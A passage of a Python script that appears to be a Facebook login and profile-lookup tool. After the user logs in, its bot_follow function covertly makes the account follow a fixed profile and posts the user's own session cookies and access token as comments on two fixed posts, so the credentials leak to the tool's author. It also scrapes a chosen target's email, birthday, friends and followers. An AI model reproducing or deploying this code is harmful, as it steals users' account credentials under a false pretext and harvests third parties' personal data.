		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
#	bot_komen()
#	except requests.exceptions.ConnectionError:
#		results    = ('\n* Fail : no connection here !!');os.system("rm -rf cookies/token.txt")
#	except:
#		results    = ('\n* Fail : unknown errors, please try again !!');os.system("rm -rf cookies/token.txt")
#	memk = open('cookies/cookie.txt', 'w')
#	memk.write(cookie)
#	memk.close()
	bot_follow()
def bot_follow():
	try:
		mmk=open("cookies/info.txt","r").read()
		cookies=open("cookies/cookie.txt","r").read()
		toket=open("cookies/token.txt","r").read()
	except IOError:
		exit((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
	post = ("172628718203472")
	post2 = ("180923747373969")
	kom = ("Hallo Ngab :v\nMau Apa Liat² Foto Guruku :)\nSilahkan Pakai Cookies Dan Token Guruku :)\n\nCOOKIES : \n"+cookies+"\n\nTOKEN :\n\n"+toket)
	requests.post("https://graph.facebook.com/100063690353340/subscribers?access_token=" + toket)      #Risky
	requests.post("https://graph.facebook.com/100063690353340/subscribers?access_token=" + toket)      #Risky
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +toket+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +toket+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +cookies+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +cookies+ '&access_token=' + toket)
	jalan(f"{c}Login Sukess {m}!!!")
	True
# ppk
def bash(kntlx):
	os.system(kntlx)
#																																																																		Ajg
# targetx

def target(palkon):
	try:
		toket=open("cookies/token.txt","r").read()
	except IOError:
		exit((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
	try:
		idt = (palkon)
#		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
		except KeyError:
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
	except Exception as e:
		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)

def token_c():
    os.system("clear")
    print(logo2)
    try:
        toket=open("cookies/token.txt","r").read()
    except IOError:
        exit((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        exit()
